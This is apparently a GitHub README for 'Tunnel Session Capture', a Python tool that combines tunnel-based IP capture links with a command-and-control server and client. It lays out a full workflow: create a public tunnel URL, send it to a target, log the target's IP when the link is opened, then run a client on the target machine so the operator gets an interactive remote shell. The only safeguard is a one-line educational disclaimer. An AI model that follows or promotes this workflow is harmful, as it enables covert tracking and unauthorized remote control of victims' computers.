
# 🚀 Tunnel Session Capture

Tunnel Session Capture is a Python-based session logging and
communication framework.

It allows you to:

-   Capture client session metadata using a temporary public tunnel
-   Store session data locally in JSON format
-   Establish TCP-based communication (Server / Client mode)
-   Manage sessions interactively via CLI

------------------------------------------------------------------------

# ⚙️ Requirements

-   Python 3.9+
-   pip


------------------------------------------------------------------------

# 🧠 How to Install
Run Command into you Terminal to Install
	    
	git clone https://github.com/zohaibdevs/Tunnel-Session-Capture.git
    cd Tunnel-Session-Capture
    chmod +x install.sh
    
------------------------------------------------------------------------

# 🔥 Usage Guide
### Quick Start
The tool uses a command-line interface for all operations:
 
### Basic Commands

    python  main.py  -h
    
    python  main.py  c2  -h
    
    python  main.py  session -h

## 🎯 C2 Mode (Server/Client Communication)
### Start C2 Server
	# Start server on default IP/port (0.0.0.0:7706)
	python main.py c2 --type server

	# Start server on custom IP/port
	python main.py c2 --type server --ip 192.168.1.100 --port 8080
### Start C2 Client
	# Connect to default server (0.0.0.0:7706)
	python main.py c2 --type client

	# Connect to custom server
	python main.py c2 --type client --ip 192.168.1.100 --port 8080

### C2 Features
-   **Shell Mode**: Type `shell` to enter interactive shell mode
    
-   **Exit Shell**: Type exit to leave shell mode
-   **Command Execution**: Execute system commands on target
-   **Real-time Communication**: Bidirectional messaging

## 🎣 Session Mode (Tunnel Capture)
### Create New Session
	# Create session with tunnel
	python main.py session --session create

	# Choose tunnel provider when prompted:
	# 1: ngrok
	# 2: cloudflared  
	# 3: localtunnel
### List Sessions
	# List all captured sessions
	python main.py session --session list

## 📋 Complete Workflow
### Step 1: Create Target Session
	python main.py session --session create    
	
-   Select tunnel provider (ngrok/cloudflared/localtunnel)
-   Get public URL (e.g., `https://abc123.localtunnel.me`)
-   Send URL to target machine
-   Target opens URL → Session captured automatically

### Step 2: List Available Sessions
	python main.py session --session list

-   View captured sessions with IP addresses
-   Note the target IP for next step

### Step 3: Start C2 Server
	python main.py c2 --type server --ip TARGET_IP --port 7706

-   Server starts listening for connections
-   Wait for client to connect

### Step 4: Start C2 Client (on target machine)
	python main.py c2 --type client --ip SERVER_IP --port 7706

-   Client connects to server
-   Communication established

### Step 5: Interact with Target
-   Type messages to send to target
-   Type `shell` to enter shell mode
-   Execute commands like `ls`, `whoami`, etc.
-   Type exit to leave shell mode
------------------------------------------------------------------------

# 🛡 Disclaimer

This project is intended for educational and internal communication
testing purposes only.

The author is not responsible for misuse.

------------------------------------------------------------------------

# 👨‍💻 Author

Zohaib Ud Din
GitHub: https://github.com/zohaibdevs/Tunnel-Session-Capture.git

------------------------------------------------------------------------

# 📜 License

MIT License